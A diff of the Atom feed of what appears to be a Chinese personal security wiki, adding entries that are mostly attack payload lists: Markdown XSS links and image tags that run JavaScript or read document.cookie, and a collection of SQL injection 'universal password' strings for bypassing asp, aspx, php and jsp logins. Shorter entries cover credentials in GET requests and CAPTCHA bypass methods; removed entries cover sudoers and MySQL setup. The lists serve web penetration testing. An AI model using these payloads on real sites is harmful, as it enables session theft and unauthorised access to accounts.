@@ -4,13 +4,201 @@
   <title><![CDATA[lonelyorWiki]]></title>
   <link href="http://www.lonelyor.org/lonelyorWiki/atom.xml" rel="self"/>
   <link href="http://www.lonelyor.org/lonelyorWiki/"/>
-  <updated>2019-05-15T09:00:28+08:00</updated>
+  <updated>2019-05-15T09:00:55+08:00</updated>
   <id>http://www.lonelyor.org/lonelyorWiki/</id>
   <author>
     <name><![CDATA[]]></name>
     
   </author>
   <generator uri="http://www.mweb.im/">MWeb</generator>
+  
+  <entry>
+    <title type="html"><![CDATA[Markdown XSS Payloads]]></title>
+    <link href="http://www.lonelyor.org/lonelyorWiki/15586769387988.html"/>
+    <updated>2019-05-24T13:48:58+08:00</updated>
+    <id>http://www.lonelyor.org/lonelyorWiki/15586769387988.html</id>
+    <content type="html"><![CDATA[
+<blockquote>
+<p>在测试某网站富文本编辑器时发现其使用了 markdown，md 会把文本转换成 html，那么肯定存在 xss 的问题，那么如何进行测试呢？于是我搜索了一番，发现前人已经有很好的研究成果了，但是鉴于安全问题的敏感，这里我就不贴原文出处了，不过感谢原作者JakobRPennington的贡献。</p>
+</blockquote>
+
+<p>Links</p>
+
+<pre class="line-numbers"><code class="language-md">[Basic](javascript:alert(&#39;Basic&#39;))
+[Local Storage](javascript:alert(JSON.stringify(localStorage)))
+[CaseInsensitive](JaVaScRiPt:alert(&#39;CaseInsensitive&#39;))
+[URL](javascript://www.google.com%0Aalert(&#39;URL&#39;))
+[In Quotes](&#39;javascript:alert(&quot;InQuotes&quot;)&#39;)
+</code></pre>
+
+<p>Images</p>
+
+<pre class="line-numbers"><code class="language-md">![Escape SRC - onload](https://www.example.com/image.png&quot;onload=&quot;alert(&#39;ImageOnLoad&#39;))
+![Escape SRC - onerror](&quot;onerror=&quot;alert(&#39;ImageOnError&#39;))
+</code></pre>
+
+<p>Fuzzing</p>
+
+<pre class="line-numbers"><code class="language-md">[XSS](javascript:prompt(document.cookie))
+[XSS](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
+[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[XSS](&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29)
+[XSS]: (javascript:prompt(document.cookie))
+[XSS](javascript:window.onerror=alert;throw%20document.cookie)
+[XSS](javascript://%0d%0aprompt(1))
+[XSS](javascript://%0d%0aprompt(1);com)
+[XSS](javascript:window.onerror=alert;throw%20document.cookie)
+[XSS](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
+[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[XSS](vbscript:alert(document.domain))
+[XSS](javascript:this;alert(1))
+[XSS](javascript:this;alert(1&amp;#41;)
+[XSS](javascript&amp;#58this;alert(1&amp;#41;)
+[XSS](Javas&amp;#99;ript:alert(1&amp;#41;)
+[XSS](Javas%26%2399;ript:alert(1&amp;#41;)
+[XSS](javascript:alert&amp;#65534;(1&amp;#41;)
+[XSS](javascript:confirm(1)
+[XSS](javascript://www.google.com%0Aprompt(1))
+[XSS](javascript://%0d%0aconfirm(1);com)
+[XSS](javascript:window.onerror=confirm;throw%201)
+[XSS](�javascript:alert(document.domain&amp;#41;)
+![XSS](javascript:prompt(document.cookie))\
+![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
+![XSS&#39;&quot;`onerror=prompt(document.cookie)](x)\
+</code></pre>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[使用GET方法传输用户账号密码的危害]]></title>
+    <link href="http://www.lonelyor.org/lonelyorWiki/15586660103989.html"/>
+    <updated>2019-05-24T10:46:50+08:00</updated>
+    <id>http://www.lonelyor.org/lonelyorWiki/15586660103989.html</id>
+    <content type="html"><![CDATA[
+<p>通过 Get 方式提交数据时，用户名和密码将出现在 URL 上，如果页面可以被缓存（浏览器缓存、cdn 缓存、服务器缓存、中间件日志缓存等）或者其他人可以访问客户这台机器，就可以从历史记录获得该用户的帐号和密码，所以表单提交建议使用 Post 方法。</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[验证码安全]]></title>
+    <link href="http://www.lonelyor.org/lonelyorWiki/15586605529996.html"/>
+    <updated>2019-05-24T09:15:52+08:00</updated>
+    <id>http://www.lonelyor.org/lonelyorWiki/15586605529996.html</id>
+    <content type="html"><![CDATA[
+<p>由于业务迭代频繁，产品线众多...好了不废话了。简单来说就是很多网站的登录界面没有验证码，只有账号密码输入框，这样不安全。</p>
+
+<h2 id="toc_0">什么是验证码</h2>
+
+<p>全自动区分计算机和人类的图灵测试（Completely Automated Public Turing test to tell Computers and Humans Apart，简称CAPTCHA），俗称验证码，是一种区分用户是计算机或人的全自动化程序。</p>
+
+<h2 id="toc_1">验证码种类</h2>
+
+<p>1、图形验证码<br/>
+2、滑动验证码（比如极验）<br/>
+3、答题验证码<br/>
+4、手机短信/邮箱验证码<br/>
+5、动态口令</p>
+
+<h2 id="toc_2">验证码的作用</h2>
+
+<p>人机识别：识别使用对应功能的是人还是机器。<br/>
+防止机器暴力攻击：防止攻击者在短时间内用机器进行批量操作（常见功能场景如：登录）。</p>
+
+<h2 id="toc_3">验证码工作原理</h2>
+
+<p><figure><img src="media/15586605529996/15586616406956.jpg" alt=""/></figure></p>
+
+<h2 id="toc_4">验证码常用场景与作用</h2>
+
+<p>登录接口常使用验证码来防御攻击者的撞库攻击<br/>
+注册接口常用验证码来防御批量恶意注册<br/>
+身份认证<br/>
+重要表单提交<br/>
+修改密码<br/>
+支付等功能</p>
+
+<h2 id="toc_5">验证码使用</h2>
+
+<p>重要接口要加验证码<br/>
+常见的如登录、注册等接口推荐使用滑动验证码；重要的如改密、支付等功能推荐使用手机短信验证码；vpn登录、身份认证等推荐使用动态口令。</p>
+
+<h2 id="toc_6">验证码对抗技术</h2>
+
+<p>1、OCR 识别图形验证码<br/>
+2、机器识别验证码（常见流程：去噪处理-图像二值化-切片处理-文件图片标准化-字符模板识别）<br/>
+3、LTE／4G 伪基站＋GSM 中间人攻击实现手机短信验证码攻击（相关安全事件可见&quot;这下一无所有了&quot;：<a href="http://netsecurity.51cto.com/art/201808/580812.htm%EF%BC%89">http://netsecurity.51cto.com/art/201808/580812.htm）</a><br/>
+4、验证码流程绕过（空验证码、返回包含验证码、验证码固定、验证码前端校验、验证流程有误）<br/>
+5、人工打码平台</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[万能密码]]></title>
+    <link href="http://www.lonelyor.org/lonelyorWiki/15585815946395.html"/>
+    <updated>2019-05-23T11:19:54+08:00</updated>
+    <id>http://www.lonelyor.org/lonelyorWiki/15585815946395.html</id>
+    <content type="html"><![CDATA[
+<blockquote>
+<p>内容收集自网络，是否有效并未验证<br/>
+原文链接：<a href="https://blog.csdn.net/u012804180/article/details/51932863">asp、aspx、php、jsp万能密码大全</a></p>
+</blockquote>
+
+<p>-------asp万能密码 <br/>
+      &#39;or&#39;=&#39;or&#39;</p>
+
+<p>--------aspx万能密码<br/>
+   1： &quot;or &quot;a&quot;=&quot;a<br/>
+   2： &#39;)or(&#39;a&#39;=&#39;a<br/>
+   3：or 1=1--<br/>
+   4：&#39;or 1=1--<br/>
+   5：a&#39;or&#39; 1=1--<br/>
+   6： &quot;or 1=1--<br/>
+   7：&#39;or&#39;a&#39;=&#39;a<br/>
+   8： &quot;or&quot;=&quot;a&#39;=&#39;a<br/>
+   9：&#39;or&#39;&#39;=&#39;<br/>
+   10：&#39;or&#39;=&#39;or&#39;<br/>
+   11: 1 or &#39;1&#39;=&#39;1&#39;=1<br/>
+   12: 1 or &#39;1&#39;=&#39;1&#39; or 1=1<br/>
+   13: &#39;OR 1=1%00<br/>
+   14: &quot;or 1=1%00<br/>
+   15: &#39;xor<br/>
+   16: 新型万能登陆密码</p>
+
+<p>   用户名 &#39; UNION Select 1,1,1 FROM admin Where &#39;&#39;=&#39; （替换表名admin）<br/>
+   密码 1<br/>
+   Username=-1%cf&#39; union select 1,1,1 as password,1,1,1 %23<br/>
+   Password=1</p>
+
+<p>   17..admin&#39; or &#39;a&#39;=&#39;a 密码随便<br/>
+ <br/>
+--------PHP万能密码<br/>
+   &#39;or&#39;=&#39;or&#39;<br/>
+   &#39;or 1=1/*  字符型 GPC是否开都可以使用</p>
+
+<p>   User: something<br/>
+   Pass: &#39; OR &#39;1&#39;=&#39;1</p>
+
+<p> <br/>
+--------jsp 万能密码<br/>
+   1&#39;or&#39;1&#39;=&#39;1<br/>
+   admin&#39; OR 1=1/*<br/>
+ <br/>
+   用户名：admin    系统存在这个用户的时候 才用得上<br/>
+   <br/>
+   密码：1&#39;or&#39;1&#39;=&#39;1</p>
+
+<hr/>
+
+<p>作者：xss_01 <br/>
+来源：CSDN <br/>
+原文：<a href="https://blog.csdn.net/u012804180/article/details/51932863">https://blog.csdn.net/u012804180/article/details/51932863</a> <br/>
+版权声明：本文为博主原创文章，转载请附上博文链接！</p>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[家思]]></title>
@@ -1253,68 +1441,6 @@ os.popen() 仅用于 windows 平台</p>
 <pre class="line-numbers"><code class="language-text">sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli --stop
 sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli --start
 </code></pre>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[linux sudo配置免密及排除部分命令]]></title>
-    <link href="http://www.lonelyor.org/lonelyorWiki/15542101741047.html"/>
-    <updated>2019-04-02T21:02:54+08:00</updated>
-    <id>http://www.lonelyor.org/lonelyorWiki/15542101741047.html</id>
-    <content type="html"><![CDATA[
-<p><code>lonelyor ALL=(ALL) NOPASSWD:ALL, !/usr/bin/reboot, !/sbin/reboot, !/sbin/ifconfig, !/sbin/shutdown, !/sbin/route, !/sbin/ip</code></p>
-
-<p>即lonelyor可以免密码执行除reboot、ifconfig、shutdown、route、ip之外的指令。</p>
-
-<p><strong>注意，/etc/sudoers的命令是顺序执行，添加在错误的位置（比如 %sudo ALL=(ALL:ALL) ALL 之前）是无效的。</strong></p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[linux sudo:/etc/sudoers 可被任何人写 解决方案]]></title>
-    <link href="http://www.lonelyor.org/lonelyorWiki/15542098568070.html"/>
-    <updated>2019-04-02T20:57:36+08:00</updated>
-    <id>http://www.lonelyor.org/lonelyorWiki/15542098568070.html</id>
-    <content type="html"><![CDATA[
-<p>只需要使用<code>su -</code>进入 root<br/>
-然后<code>cd /etc</code>，使用<code>chmod 0440 sudoers</code>将权限改回来即可。</p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[debian or ubuntu 修改终端欢迎语]]></title>
-    <link href="http://www.lonelyor.org/lonelyorWiki/15542044701566.html"/>
-    <updated>2019-04-02T19:27:50+08:00</updated>
-    <id>http://www.lonelyor.org/lonelyorWiki/15542044701566.html</id>
-    <content type="html"><![CDATA[
-<p>与其他 linux 不太一样哦。Debian 系直接修改/etc/motd文件重登录后是无效的。</p>
-
-<p>因为这里/etc/motd是一个符号链接，指向/var/run/motd，应该 是一个启动后在生成的文件。在版本12.04中，找到生成的脚本在目录/etc/update-motd.d/中<br/>
-<code>sudo nano /etc/update-motd.d/10-uname</code><br/>
-在 10-uname 中可以添加命令，比如：<code>cat /home/test.txt</code>。即可展示出 test.txt 中的内容。</p>
-
-<p>修改后用：sudo run-parts /etc/update-motd.d 去执行就会立即见到效果，而不用反复注销登录。</p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[mysql登录提示ERROR 1524 (HY000): Plugin 'unix_socket' is not loaded解决方法]]></title>
-    <link href="http://www.lonelyor.org/lonelyorWiki/15542027955936.html"/>
-    <updated>2019-04-02T18:59:55+08:00</updated>
-    <id>http://www.lonelyor.org/lonelyorWiki/15542027955936.html</id>
-    <content type="html"><![CDATA[
-<blockquote>
-<p>参考文章：<a href="https://blog.csdn.net/u012804180/article/details/80801351">https://blog.csdn.net/u012804180/article/details/80801351</a></p>
-</blockquote>
-
-<p><figure><img src="media/15542027955936/15542028794210.jpg" alt=""/></figure></p>
-
-<p>上面这篇才是正解，别的文章仿佛在放狗屁。<br/>
-最烦那些转载文章时照抄照搬，自己完全不验证的人；也很烦那些写文章写得不清不楚的人。</p>
 
 ]]></content>
   </entry>
